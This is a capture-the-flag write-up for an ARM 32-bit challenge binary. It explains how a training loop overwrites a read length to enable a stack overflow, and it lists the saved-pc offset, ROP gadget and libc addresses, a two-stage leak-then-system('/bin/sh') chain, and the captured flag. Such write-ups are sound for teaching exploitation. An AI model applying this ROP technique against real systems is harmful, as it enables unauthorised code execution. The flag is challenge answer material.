# Arm Training Last Write-up

## TL;DR

`arm_training-last` is a 32-bit ARM ELF with NX, no canary, no PIE, and partial RELRO.

The intended bug is a stack overwrite in the `y` training loop. The loop writes `~` (`0x7e`) into a local stack buffer once per second. After 24 writes it overwrites the one-byte length used by the later `read`, changing it from `0x14` to `0x7e`. Then choosing `n` reaches:

```c
read(0, fp - 0x34, size);
```

With `size == 0x7e`, this overflows up to saved `pc`. The saved `pc` offset from the second read buffer is `52`.

## Protections

```text
Arch:   arm-32-little
RELRO:  Partial RELRO
Canary: No canary
NX:     NX enabled
PIE:    No PIE
```

Useful addresses in the non-PIE binary:

```text
pop {r3, pc}                         = 0x10480
mov r0, r3 ; pop {fp, pc}            = 0x106e4
bl puts ; branch back to main prompt = 0x107bc
puts@got                             = 0x21028
```

Provided libc offsets:

```text
puts    = 0x66bf0
system  = 0x4182c
/bin/sh = 0x167c50
```

## Exploit Idea

1. Send `yA` for the first prompt. It must be exactly 2 bytes so no newline remains for `input_check`.
2. Wait for 24 printed `~` bytes. The 24th write changes the later read length byte to `0x7e`.
3. Send newline to stop training.
4. The program returns to the same `main` frame and asks again. Send `nA`.
5. Overflow the saved `pc`.
6. First ROP:
   - set `r0 = puts@got`
   - jump to the in-binary `bl puts` site
   - leak libc
7. Second ROP:
   - set `r0 = libc + "/bin/sh"`
   - jump to `libc + system`

One wrinkle: the `mov r0, r3 ; pop {fp, pc}` gadget clobbers `fp`. To re-enter the still-live `main` frame after the leak, the exploit needs the current frame pointer value. In my local qemu+gdb run this was `0x407ff95c`; pass it as `FP=...`.

## Run

```bash
python3 solve.py BASE=0x3fe20000
```

The remote libc base was stable across runs:

```text
puts leak = 0x3fe86bf0
libc base = 0x3fe20000
```

So the final exploit uses the first overflow directly:

```text
r0 = libc + "/bin/sh"
pc = libc + system
```

Then it sends `cat /flag`.

The script also keeps the two-stage leak path for analysis:

```bash
python3 solve.py FP=0x407ff95c
```

## Flag

```text
DH{277D9F0FA97B6680E11B78603C9C2736995E792A5F413F5F0EAF432BD211530F}
```
